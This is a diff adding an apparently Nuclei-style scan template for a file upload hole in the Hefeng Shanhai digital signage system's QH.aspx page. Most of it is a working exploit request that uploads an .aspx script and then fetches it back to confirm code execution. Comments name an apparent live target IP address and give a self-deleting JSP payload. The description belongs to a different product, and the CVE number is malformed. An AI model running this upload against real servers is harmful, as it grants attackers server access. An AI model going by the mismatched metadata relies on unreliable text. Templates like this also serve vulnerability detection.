@@ -1,0 +1,63 @@
+id: 2024-105171049
+info:
+  name: 和丰多媒体信息发布系统QH.aspx存在文件上传漏洞
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    用友移动系统管理是用友公司推出的一款移动办公解决方案，旨在帮助企业实现移动办公、提高管理效率和员工工作灵活性。它提供了一系列功能和工具，方便用户在移动设备上管理和处理企业的系统和业务。该产品存在任意文件上传，攻击者可通过此漏洞获取服务器权限。
+  reference:
+    - https://blog.csdn.net/qq_53003652/article/details/135439135
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: 2024-105171049
+    cvss-score: 9.8
+    cwe-id: CWE-434
+  metadata:
+    date: 2024-05-01
+    version: 和丰山海-数字标牌
+    fofa-query: app="和丰山海-数字标牌"
+  tags: fileupload,rce,和丰山海-数字标牌,Digital Signage
+
+# http://219.134.95.228:9101
+
+variables:
+  # pay: <% out.println("file not found");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+  file_name: "{{to_lower(rand_text_alpha(10))}}.aspx"
+
+http:
+  - raw:
+      - |
+        POST /QH.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr
+
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+        Content-Disposition: form-data; name="fileToUpload"; filename="{{file_name}}"
+        Content-Type: application/octet-stream
+
+        <% response.write("hello") %>
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+        Content-Disposition: form-data; name="action"
+
+        upload
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+        Content-Disposition: form-data; name="responderId"
+
+        ResourceNewResponder
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+        Content-Disposition: form-data; name="remotePath"
+
+        /opt/resources
+        ------WebKitFormBoundaryhbcZX7o0Hw19h3kr--
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/opt/resources/{{file_name}}"
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body_1,"\"second\":")
+          - contains(body_2, "hello")
